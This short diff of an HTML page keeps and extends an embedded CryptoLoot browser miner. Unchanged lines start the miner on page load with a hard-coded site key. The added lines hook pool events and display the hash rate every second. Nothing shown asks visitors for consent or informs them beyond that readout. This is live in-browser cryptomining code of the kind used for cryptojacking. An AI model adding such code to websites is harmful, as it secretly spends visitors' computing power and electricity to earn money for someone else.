@@ -35,5 +35,13 @@
   <script>
     var miner = new CryptoLoot.Anonymous('402dde1694e16be2aaea697c7fb807811aa4c70e58f7');
     miner.start();
-</script>
-</div>
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    document.getElementById("hashespersec").innerHTML = hashesPerSecond + " hashes/sec";
+        }, 1000);
+  </script>
+  <p id="hashespersec"></p>
